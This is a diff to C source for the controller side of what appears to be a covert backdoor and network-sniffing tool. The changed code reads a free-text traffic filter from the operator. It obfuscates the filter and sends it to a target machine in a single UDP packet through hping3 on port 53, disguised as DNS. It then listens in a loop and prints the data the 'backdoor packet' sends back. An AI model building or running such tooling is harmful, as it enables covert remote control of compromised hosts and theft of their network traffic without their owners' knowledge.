@@ -23,10 +23,14 @@
 -------------------------------------------------------------------------------------------------*/
 
 #include "sniffer.h"
-
+pid_t pid;
 
 int main(int argc, char *argv[]) {
     struct options_sniffer opts;
+    struct sockaddr_in sniffer_addr, target_addr;
+    socklen_t target_addr_len;
+    char buffer[1024] = {0};
+    int option = 1;
 
     check_root_user();
     options_sniffer_init(&opts);
@@ -37,6 +41,36 @@ int main(int argc, char *argv[]) {
     //TODO: encrypt user input
     encrypt_and_create_instruction_file(&opts);
     send_instruction(&opts);
+
+    if ( (opts.sniffer_socket = socket(AF_INET, SOCK_DGRAM, 0)) < 0 ) {
+        perror("socket creation failed");
+        exit(EXIT_FAILURE);
+    }
+
+    memset(&sniffer_addr, 0, sizeof(sniffer_addr));
+
+    sniffer_addr.sin_family    = AF_INET;
+    sniffer_addr.sin_addr.s_addr = INADDR_ANY;
+    sniffer_addr.sin_port = htons(DEFAULT_PORT);
+
+    option = 1;
+    setsockopt(opts.sniffer_socket, SOL_SOCKET, SO_REUSEADDR, &option, sizeof(option));
+
+    // Bind the socket with the server address
+    if ( bind(opts.sniffer_socket, (const struct sockaddr *)&sniffer_addr,
+              sizeof(sniffer_addr)) < 0 ) {
+        perror("bind failed");
+        exit(EXIT_FAILURE);
+    }
+
+    target_addr_len = sizeof(target_addr);
+    puts("Receiving from backdoor packet ...");
+    while(1) {
+        signal(SIGINT,sig_handler);
+        recvfrom(opts.sniffer_socket, buffer, sizeof(buffer), 0, (struct sockaddr *)&target_addr, &target_addr_len);
+        printf("%s\n", buffer);
+        memset(buffer, 0, sizeof(buffer));
+    }
 
     return 0;
 }
@@ -49,8 +83,7 @@ void options_sniffer_init(struct options_sniffer *opts) {
 
 void get_user_input(struct options_sniffer *opts) {
     get_ip_address(opts);   /* IP address for Hping */
-    get_protocol(opts);     /* Instruction [ PROTOCOL ] */
-    get_port(opts);         /* Instruction [ PORT ] */
+    get_instruction(opts);         /* Instruction [ PORT ] */
 }
 
 
@@ -74,58 +107,22 @@ void get_ip_address(struct options_sniffer *opts) {
 }
 
 
-void get_protocol(struct options_sniffer *opts) {
-    char input[3] = {0};
+void get_instruction(struct options_sniffer *opts) {
+    char input[64] = {0};
     uint8_t input_length = 0;
 
     while(1) {
-        puts("\n[ SNIFFING PROTOCOL ]");
-        puts("1. TCP");
-        puts("2. UDP");
-        printf("Select [ PROTOCOL ] to forward the backdoor instruction: ");
+        puts("\n[ SNIFFING Instruction ]");
+        puts("Type [ Instruction ] to forward the backdoor instruction");
+        puts("ex) tcp and dst port 443");
         fflush(stdout);
 
         fgets(input, sizeof(input), stdin);
         input_length = (uint8_t) strlen(input);
-        input[input_length] = '\0';
-        if (input_length == 2) {
-            if (atoi(input) == 1) {
-                strcpy(opts->sniff_protocol, "tcp");
-                break;
-            }
-            else if (atoi(input) == 2) {
-                strcpy(opts->sniff_protocol, "udp");
-                break;
-            }
-            else {
-                memset(input, 0, sizeof(input));
-                puts("Port must 1 or 2");
-            }
-        }
-    }
-}
-
-
-void get_port(struct options_sniffer *opts) {
-    uint8_t input_length = 0;
-    char port[8] = {0};
-
-    while(1) {
-        puts("\n[ SNIFFING PORT ]");
-        printf("Enter [ PORT ] to forward the backdoor instruction: ");
-        fflush(stdout);
-        fgets(port, sizeof(port), stdin);
-        input_length = (uint8_t) strlen(port);
+        input[input_length - 1] = '\0';
         if (input_length > 0) {
-            port[input_length] = '\0';
-            if (is_valid_port(port)) {
-                opts->sniff_port = (uint16_t) atoi(port);
-                break;
-            }
-            else {
-                memset(port, 0, sizeof(port));
-                puts("Port must between 0 ~ 65535");
-            }
+            strcpy(opts->sniff_instruction, input);
+            break;
         }
     }
 }
@@ -137,9 +134,8 @@ bool confirm_user_input(struct options_sniffer *opts) {
     char c[3] = {0};
 
     printf("\n=============== CONFIRM ===============\n");
-    printf("[    IP    ] %s\n", opts->sniff_ip);
-    printf("[ PROTOCOL ] %s\n", opts->sniff_protocol);
-    printf("[   PORT   ] %d\n", opts->sniff_port);
+    printf("[      IP     ] %s\n", opts->sniff_ip);
+    printf("[ Instruction ] %s\n", opts->sniff_instruction);
     printf("=======================================\n");
     printf("Is this correct? [ Y / N ]: ");
     fflush(stdout);
@@ -163,14 +159,6 @@ bool is_valid_ipaddress(char *ip_address) {
 }
 
 
-bool is_valid_port(char *port) {
-    int result = FALSE;
-
-    if (atoi(port) >= 0 && atoi(port) < 65536) result = TRUE;
-    return result;
-}
-
-
 void encrypt_and_create_instruction_file(struct options_sniffer *opts) {
     FILE *output;
 
@@ -179,7 +167,7 @@ void encrypt_and_create_instruction_file(struct options_sniffer *opts) {
         exit(1);
     }
 
-    sprintf(opts->command, "start[%s dst port %d]end", opts->sniff_protocol, opts->sniff_port);
+    sprintf(opts->command, "start[%s]end", opts->sniff_instruction);
     for (int i = 0; i < strlen(opts->command); i++) {
         opts->encrypt_command[i] = encrypt_decrypt(opts->command[i]);
     }
@@ -201,10 +189,19 @@ void send_instruction(struct options_sniffer *opts) {
         exit(1);
     }
     else if (pid == 0) {
-        sprintf(hping3, "sudo hping3 -c 1 -2 -E ./instruction.txt -d 100 -p 58824 %s", opts->sniff_ip);
+        sprintf(hping3, "sudo hping3 -c 1 -2 -E ./instruction.txt -d 100 -p 53 %s", opts->sniff_ip);
         system(hping3);
     }
     else {
         wait(NULL);
     }
 }
+
+
+void sig_handler(int signum) {
+    //Return type of the handler function should be void
+    pid = getpid();
+    printf("Ctrl + C pressed\n Exit program \n");
+    kill(pid,SIGUSR1);
+}
+
